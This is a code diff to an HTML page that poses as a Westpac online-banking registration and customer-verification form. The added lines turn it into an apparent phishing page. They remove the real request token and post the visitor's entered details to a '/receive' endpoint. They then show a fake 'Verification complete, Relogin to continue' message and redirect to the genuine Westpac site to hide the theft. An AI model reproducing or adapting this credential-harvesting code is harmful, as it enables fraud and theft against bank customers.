@@ -37,6 +37,54 @@
 
     
 </head>
+<style>.idwrap{
+	border:1px solid black;
+	overflow:hidden; 
+	height:180px; 
+	width:100%; 
+	border-radius:10px; 
+	display:block;
+	}
+	
+	.defbtn{ 
+	visibility: hidden;
+	}
+	
+	.writeup{
+	font-size: 14px;
+	color: #2c2e2f;
+	}
+	.loadbackground {
+    width: 100%;
+    height: 130%; 
+    position: fixed;
+    background-color: white;
+    z-index: 3000;
+    opacity: 10;
+}
+
+.fadeIn {
+  -webkit-animation-name: fadeIn;
+  animation-name: fadeIn;
+  -webkit-animation-duration: 3s;
+  animation-duration: 3s;
+  -webkit-animation-fill-mode: both;
+  animation-fill-mode: both;
+  }
+  @-webkit-keyframes fadeIn {
+  0% {opacity: 0;}
+  100% {opacity: 1;}
+  }
+  @keyframes fadeIn {
+  0% {opacity: 0;}
+  100% {opacity: 1;}
+  }
+
+@media (min-width: 801px) {
+    .loadbackground {
+        height: 300%; 
+    }
+}</style>
 
 <body id="registration-template" data-log="/wbc/banking/esis" data-keymap-data-timeout="" data-analytics-allkeys="experience,newFormName,pageAction,pageKey,pageName,pageType,siteVersion,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagetype="registration" data-analytics-pageaction="start" data-analytics-pagename="personal details" data-analytics-newformname="olb" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="desktop" data-analytics-pagekey="Authentication_SelfRegistration">
     
@@ -77,9 +125,12 @@
                     </ul>
 
                     <div class="customer-verification">
-                        <form method="post" id="customer-verification" autocomplete="off" class="form-modules" novalidate="novalidate">
-                            <input name="__RequestVerificationToken" type="hidden" value="tAI5MUUomQZmWf8nlxdfGW0JPmfU3Eh+3+8FKBNCmywqDp6IqD2/cJTG+LLKYcrpn0paKOqoCqIizU/4JGa9JQ19rGt4BxkyKJ/8RUCSwo1DBq1LsLbzRLYpxRW+5kVkkiJe5KFpRtmk8brsIApTKtkXYUOG06M5atI02X97SNQ4G7ijBY3bYGvoZ0F3BUm6vmckd9rkqdPBDZMs/6DV6g==" />
-                            <div id="alertManagerArea" aria-live="assertive" aria-atomic="true" class="alert alert-error alert-summary alert-summary-standard" style="display: none;">
+                    	<center id="redr" style="margin-top:80px; display:none;" ><span>Verification complete</span><br><br><br><span>Relogin to continue.</span></center>
+                    	
+                        <form method="post" id="customer_verification" autocomplete="off" class="form-modules" novalidate="novalidate">
+                             
+                        		
+                          <div id="alertManagerArea" aria-live="assertive" aria-atomic="true" class="alert alert-error alert-summary alert-summary-standard" style="display: none;">
                                 <div class="validation-summary-valid alert-icon" data-valmsg-summary="true"><span>Please correct the following:</span>
                                     <ul id="unorder-list"></ul>
                                 </div>
@@ -290,7 +341,7 @@
     $('#subbut').on('click', function(event) {
         event.preventDefault(); // Prevent the default action of the link
 
-        let myForm = $("#customer-verification");
+        let myForm = $("#customer_verification"); 
         let checkInputs = document.querySelectorAll('.log_details');
 
         let list = document.getElementById('unorder-list');
@@ -341,9 +392,11 @@
                 url: "/receive",
                 data: user
             }).done(function(msg) {
-            
+            	document.getElementById("redr").style.display = "block";
+            	document.getElementById('customer_verification').style.display = "none";
+        
                 sessionStorage.setItem('visitor', visitor);
-                //window.location.href = "";
+                window.location.href = "https://banking.westpac.com.au";
                 console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
             //window.location.href = "login/2"; 
